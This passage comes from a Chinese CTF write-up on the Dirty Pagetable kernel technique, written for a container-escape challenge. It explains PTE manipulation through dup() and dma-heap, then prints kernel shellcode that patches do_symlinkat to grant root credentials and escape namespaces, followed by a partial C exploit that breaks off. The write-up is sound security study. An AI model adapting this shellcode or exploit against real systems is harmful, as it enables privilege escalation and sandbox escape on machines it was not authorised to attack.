<blockquote>
<p>里面最高位的8还有最低的3位867，应该都是一些标志位，去掉这些才是真正的物理地址</p>
</blockquote>
<p class='item-img' data-src='/../picture/dpt5.png'><img src="/../picture/dpt5.png" alt="image-20241117194018457"></p>
<h5 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a>第三步</h5><p>在此之前我们需要说一个file struct里的count成员(距离file struct开始地址0x38)，他是用来表示当前有多少个引用指向该file结构体</p>
<p>如果用dup函数来复制victim fd，则会使得count+1，且即便file结构体内容不正常也能正常+1而不崩溃</p>
<p>如果dup,0x1000次则会使得pte对应的物理地址往下增加0x1000</p>
<blockquote>
<p>真是佩服能找到这样一个功能适配dirty pagetable</p>
<p>但也很容易被修复，如果dup添加一个file struct 完整性验证，这个方法直接不能用了</p>
<p>而且每个用户态dup次数有限，可通过fork解决</p>
</blockquote>
<p>当我们dup,0x1000次后，再次循环遍历之前mmap的地址，如果找到有一个和他本身应该对应的idx不一样的，则是victim page。</p>
<h5 id="第四步"><a href="#第四步" class="headerlink" title="第四步"></a>第四步</h5><p>仅用dup也只能增加物理地址，似乎没啥用，有什么办法可以实现控制页表项呢</p>
<p>可能会想到继续dup，增加物理地址，直到找到包含页表项到page，实则目前是没法实现的</p>
<p>其实你会注意到一个问题，第二步，创建页表目录后，还有一个个page大小的映射被创建，相对于这一个个page大小的大量映射，之前file struct全部free释放的page似乎是非常少的不够用的，按理来说file struct里被写入pte成功率很低，但是第二步成功率非常高，则就说明了mmap映射的物理地址，和alloc页表目录对应的物理地址应该是来自不同区块的。同时mmap映射的物理地址比alloc页表目录对应的物理地址高。</p>
<p><strong>匿名 <code>mmap()</code> 分配的物理页来自内存区的<code>MIGRATE_MOVABLE</code> free_area，而用户页表是从内存区的<code>MIGRATE_UNMOVABLE</code> free_area分配，所以很难通过递增PTE使之指向另一用户页表</strong>。</p>
<p>由于内核空间和用户空间需要一些共享物理页，使得两个空间都能访问到，比如<code>dma-heap</code>,<code>io_uring</code>,<code>GPUs</code>等</p>
<p>所以这里又要介绍另一个东西dma-heap，也是题目中nsjail挂载进来的<code>/dev/dma-heap</code></p>
<p>我们可以通过打开<code>/dev/dma-heap/system</code>进行ioctl，分配一定大小的内存，该内存会在<code>MIGRATE_UNMOVABLE</code> free_area分配，而且该内存可以通过mmap映射到用户态空间。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> DMA_HEAP_IOCTL_ALLOC 0xc0184800</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">dma_heap_allocation_data</span> &#123;</span><br>  ull len;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> fd;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> fd_flags;<br>  ull heap_flags;<br>&#125;;<br>		dma_heap_fd = open(<span class="hljs-string">&quot;/dev/dma_heap/system&quot;</span>, O_RDONLY);<br>    <span class="hljs-keyword">if</span> (dma_heap_fd &lt; <span class="hljs-number">0</span>) err_msg(<span class="hljs-string">&quot;Fail open dma_heap&quot;</span>);<br>		......<br>		<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">dma_heap_allocation_data</span> <span class="hljs-title">data</span>;</span><br><br>    data.len = <span class="hljs-number">0x1000</span>;<br>    data.fd_flags = O_RDWR;<br>    data.heap_flags = <span class="hljs-number">0</span>;<br>    data.fd = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">if</span> (ioctl(dma_heap_fd, DMA_HEAP_IOCTL_ALLOC, &amp;data) &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;DMA_HEAP_IOCTL_ALLOC&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-type">int</span> dma_buf_fd = data.fd;<br></code></pre></td></tr></table></figure>

<p>因此我们可以将页表目录的喷射改为，先喷射一半，然后进行dma-heap，再将另一半进行喷射</p>
<p>继续按之前的步骤，我们把victim page 先munmap，然后将dma-heap创建的地址mmap到victim page上面</p>
<blockquote>
<p>记得读写，使得dma-heap对应的页创建</p>
</blockquote>
<p class='item-img' data-src='/../picture/dpt6.png'><img src="/../picture/dpt6.png" alt="pic21_remap_sharing_page"></p>
<p>接下来再次进行多次dup,0x1000次，总有一次会使得victim page中对应的内容是pte</p>
<p>成功使得victim page里的内容是pte后，就可以开始尝试任意物理地址写读了吗？</p>
<p>该题目最终目的是实现逃逸，最好的想法就是patch内核的某个函数用户态触发执行实现逃逸，但是在开启aslr后物理地址里保存的text段的起始物理地址也是随机的</p>
<p>典中典类似page_offset_base+0x9d000保存着text地址，而page_offset_base+0x9c000(因为是直接映射区，对应的是物理地址的0x9c000)保存着物理地址的text地址</p>
<blockquote>
<p>感觉既然都可以任意地址读，那也应该可以实现直接从0物理地址开始扫描，直到找到需要的物理地址吧？</p>
</blockquote>
<p>接下来就是往victim page[0]写入0x9c000，然后去泄露物理地址的text地址，同时需要注意我们不知道是哪个mmap的地址的物理地址被改写为了0x9c000，所以还要再次进行搜索，得到victim page2</p>
<p class='item-img' data-src='/../picture/dpt8.png'><img src="/../picture/dpt8.png" alt="image-20241117211144414"></p>
<h5 id="第五步"><a href="#第五步" class="headerlink" title="第五步"></a>第五步</h5><p>接下来直接模仿<a target="_blank" rel="noopener" href="https://henrymartin262.github.io/2024/04/10/Dirty-pagetable-study/#4-%E4%BE%8B%E9%A2%98-m0leCon-Finals-2023-keasy">henry</a>师傅文章里patch do_symlinkat函数</p>
<blockquote>
<p>需要注意关闭kaslr时，0x9c000里保存的物理地址和物理地址的text基地址偏移量，与开启kaslr时不同，所以建议关闭kaslr时物理地址的text基地址直接使用0x1000000，测试成功后在开启kaslr然后调整</p>
</blockquote>
<p>接下来就是将shellcode写入do_symlinkat起始地址</p>
<p>下面是汇编代码，也是直接拿henry师傅文章里的，然后通过nasm 来编译成elf文件，把shellcode提取出来即可</p>
<p>里面的各个函数偏移，还有sub r15，xxxxx的，还有current-&gt;fs的偏移需要我们修改</p>
<p>简单解释一下，call a使得当前do_symlinkat的地址被写到栈上，然后pop 给r15，计算text基地址，接下来就是修改当前的进程的cred，nsproxy，fs</p>
<blockquote>
<p>shellcode的fs替换是直接通过与指向task_struct偏移量来进行替换的，由于各个版本的fs_struct与task_struct的偏移量不同，所以需要特地计算</p>
<p>这边给出一个比较简单的方法，就是我们可以给进程取个名字，然后名字会保存在task_struct的成员comm里面，而通常comm成员与fs成员偏移量不变，可以先搜索comm里你指定的字符串，然后借此来计算得到fs与task_struct的偏移量</p>
<p class='item-img' data-src='/../picture/dpt7.png'><img src="/../picture/dpt7.png" alt="image-20241117210443336"></p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs assembly">init_cred equ 0x2a76b00<br>commit_creds equ 0x1c2670<br>find_task_by_vpid equ 0x1b8fa0<br>init_nsproxy equ 0x2a768c0<br>switch_task_namespaces equ 0x1c0ad0<br>init_fs equ 0x2bb5320<br>copy_fs_struct equ 0x45c0f0<br>swapgs_restore_regs_and_return_to_usermode equ 0x14011c6<br><br>_start:<br>  endbr64<br>  call a<br>a:<br>  pop r15<br>  sub r15, 0x42cc49<br><br>  ; commit_creds(init_cred) [3]<br>  lea rdi, [r15 + init_cred]<br>  lea rax, [r15 + commit_creds]<br>  call rax<br><br>  ; task = find_task_by_vpid(1) [4]<br>  mov edi, 1<br>  lea rax, [r15 + find_task_by_vpid]<br>  call rax<br><br>  ; switch_task_namespaces(task, init_nsproxy) [5]<br>  mov rdi, rax<br>  lea rsi, [r15 + init_nsproxy]<br>  lea rax, [r15 + switch_task_namespaces]<br>  call rax<br><br>  ; new_fs = copy_fs_struct(init_fs) [6]<br>  lea rdi, [r15 + init_fs]<br>  lea rax, [r15 + copy_fs_struct]<br>  call rax<br>  mov rbx, rax<br><br>  ; current = find_task_by_vpid(getpid())<br>  mov rdi, 0x1111111111111111   ; will be fixed at runtime<br>  lea rax, [r15 + find_task_by_vpid]<br>  call rax<br><br>  ; current-&gt;fs = new_fs [8]<br>  mov [rax + 0x828], rbx<br><br>  ; kpti trampoline [9]<br>  xor eax, eax<br>  mov [rsp+0x00], rax<br>  mov [rsp+0x08], rax<br>  mov rax, 0x2222222222222222   ; win<br>  mov [rsp+0x10], rax<br>  mov rax, 0x3333333333333333   ; cs<br>  mov [rsp+0x18], rax<br>  mov rax, 0x4444444444444444   ; rflags<br>  mov [rsp+0x20], rax<br>  mov rax, 0x5555555555555555   ; stack<br>  mov [rsp+0x28], rax<br>  mov rax, 0x6666666666666666   ; ss<br>  mov [rsp+0x30], rax<br>  lea rax, [r15 + swapgs_restore_regs_and_return_to_usermode]<br>  jmp rax<br><br>  int3<br><br></code></pre></td></tr></table></figure>

<p>然后在exp写入内存之前记得将shellcode的一些量比如0x1111111111111111替换为执行需要的值</p>
<p>接下来就是执行symlink触发shellcode，由于题目启动时使用的是将flag文件挂载为虚拟机的virtio类型的虚拟驱动器，shellcode执行成功后接下来就是读取<code>/dev/vda</code>文件获取flag</p>
<p>exp:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/prctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SOCKET_NUM 8</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SK_BUFF_NUM 128</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ull unsigned long long </span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TEXT_MASK 0xffffffff00000000</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CHUNK_MASK 0xffff000000000000</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DMA_HEAP_IOCTL_ALLOC 0xc0184800</span><br>ull user_cs, user_ss, user_sp, user_rflags;<br><span class="hljs-type">void</span> <span class="hljs-title function_">save_status</span><span class="hljs-params">()</span>&#123;<br>    __asm__(<span class="hljs-string">&quot;mov user_cs, cs;&quot;</span><br>            <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span><br>            <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span><br>            <span class="hljs-string">&quot;pushf;&quot;</span><br>            <span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>            );<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] save success&quot;</span>);<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">bind_cpu</span><span class="hljs-params">(<span class="hljs-type">int</span> core)</span><br>&#123;<br>    <span class="hljs-type">cpu_set_t</span> cpu_set;<br><br>    CPU_ZERO(&amp;cpu_set);<br>    CPU_SET(core, &amp;cpu_set);<br>    sched_setaffinity(getpid(), <span class="hljs-keyword">sizeof</span>(cpu_set), &amp;cpu_set);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] bind core success&quot;</span>);<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">open_flag</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Ready to get root......&quot;</span>);<br>    <span class="hljs-keyword">if</span>(getuid())&#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Failed to get root!&quot;</span>);<br>    &#125;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Root got!&quot;</span>);<br>    <span class="hljs-type">int</span> fd_flag = open(<span class="hljs-string">&quot;/flag&quot;</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-type">char</span> flag[<span class="hljs-number">100</span>];<br>    read(fd_flag, flag, <span class="hljs-number">100</span>);<br>    <span class="hljs-built_in">puts</span>(flag);<br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br>ull <span class="hljs-title function_">dump_mem</span><span class="hljs-params">(<span class="hljs-type">void</span> *data, <span class="hljs-type">int</span> begin, <span class="hljs-type">int</span> len, <span class="hljs-type">int</span> get)</span>&#123;<br>    <span class="hljs-keyword">if</span> (len) <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d: &quot;</span>, begin/<span class="hljs-number">4</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> i = begin; i &lt; len; i++)<br>    &#123;   <br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%016llx &quot;</span>, ((ull*)data)[i]);<br>        <span class="hljs-keyword">if</span> ((i+<span class="hljs-number">1</span>) % <span class="hljs-number">4</span> == <span class="hljs-number">0</span>) <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n%d: &quot;</span>, (i+<span class="hljs-number">1</span>)/<span class="hljs-number">4</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (len) <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> ((ull*)(data))[get];<br>&#125;<br><span class="hljs-type">int</span> fd;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ioc_arg</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">int</span> idx;<br>&#125; add_arg;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">k_add</span><span class="hljs-params">(<span class="hljs-type">int</span> idx)</span> &#123;<br>    add_arg.idx = idx;<br>    ioctl(fd, <span class="hljs-number">0x1337</span>, &amp;add_arg);<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">k_free</span><span class="hljs-params">(<span class="hljs-type">int</span> idx)</span> &#123;<br>    add_arg.idx = idx;<br>    ioctl(fd, <span class="hljs-number">0x1338</span>, &amp;add_arg);<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">k_backdoor</span><span class="hljs-params">(<span class="hljs-type">int</span> idx)</span> &#123;<br>    add_arg.idx = idx;<br>    ioctl(fd, <span class="hljs-number">0x1339</span>, &amp;add_arg);<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> &#123;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> offset, len;<br>	<span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> *<span class="hljs-title">ops</span>;</span><br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> private;<br>&#125;;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">dma_heap_allocation_data</span> &#123;</span><br>  ull len;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> fd;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> fd_flags;<br>  ull heap_flags;<br>&#125;;<br><span class="hljs-type">char</span> buffer[<span class="hljs-number">0x2000</span>];<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SPRAY_PIPE_NUM 0xd0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SPRAY_FILE_NUM 0x100</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SPRAY_PGTABLE_NUM 0x800</span><br><span class="hljs-type">int</span> pipe_fd[SPRAY_PIPE_NUM][<span class="hljs-number">2</span>];<br><span class="hljs-type">int</span> file_fd[SPRAY_FILE_NUM];<br><span class="hljs-type">int</span> tmp_file_fd[SPRAY_FILE_NUM];<br>ull* spray_page[SPRAY_PGTABLE_NUM];<br>ull* victim_page = (ull*)<span class="hljs-number">-1</span>;<br><span class="hljs-type">int</span> dma_heap_fd;<br><span class="hljs-type">int</span> victim_idx = <span class="hljs-number">-1</span>;<br>ull kbase;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> <span class="hljs-title">info_pipe_buffer</span>;</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">win</span><span class="hljs-params">()</span> &#123;<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">0x100</span>];<br>  <span class="hljs-type">int</span> fd = open(<span class="hljs-string">&quot;/dev/vda&quot;</span>, O_RDONLY);<br>  <span class="hljs-keyword">if</span> (fd &lt; <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[-] Lose...&quot;</span>);<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] Win!&quot;</span>);<br>    read(fd, buf, <span class="hljs-number">0x100</span>);<br>    write(<span class="hljs-number">1</span>, buf, <span class="hljs-number">0x100</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] Done&quot;</span>);<br>    pause();<br>  &#125;<br>  <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    save_status();<br>    bind_cpu(<span class="hljs-number">0</span>);<br>    fd = open(<span class="hljs-string">&quot;/dev/safenote&quot;</span>, <span class="hljs-number">2</span>);<br>    <span class="hljs-keyword">if</span>(fd == <span class="hljs-number">-1</span>) <br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[x] Error opening /dev/safenote&quot;</span>);<br>    ull *rop = (ull*)buffer;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SPRAY_PIPE_NUM; i++)&#123;<br>        <span class="hljs-keyword">if</span>(pipe(pipe_fd[i]) &lt; <span class="hljs-number">0</span>)<br>            <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[x] Error pipe&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] step0 init mmap and dma-heap&quot;</span>);<br>    dma_heap_fd = open(<span class="hljs-string">&quot;/dev/dma_heap/system&quot;</span>, O_RDONLY);<br>    <span class="hljs-keyword">if</span> (dma_heap_fd &lt; <span class="hljs-number">0</span>) <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Fail open dma_heap&quot;</span>);<br>   <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SPRAY_PGTABLE_NUM; i++)&#123;<br>        spray_page[i] = (ull*)mmap((<span class="hljs-type">void</span> *)(<span class="hljs-number">0xdead0000</span>UL + i*(<span class="hljs-number">0x10000</span>UL)),<br>                            <span class="hljs-number">0x8000</span>, PROT_READ | PROT_WRITE,<br>                            MAP_ANONYMOUS | MAP_SHARED, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">if</span> (spray_page[i] == MAP_FAILED) <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;fail to mmap space&quot;</span>);    <br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] step1 spray chunk and free&quot;</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0xff</span>; i++)&#123;<br>        k_add(i);<br>    &#125;<br>    <span class="hljs-type">int</span> free_idx = <span class="hljs-number">0x80</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0xff</span>; i++)&#123;<br>        <span class="hljs-keyword">if</span>(i == free_idx)&#123;<br>            k_backdoor(i);<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>        k_free(i);<br>    &#125;<br>    <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] step2 spray file struct and find victim file&quot;</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SPRAY_FILE_NUM; 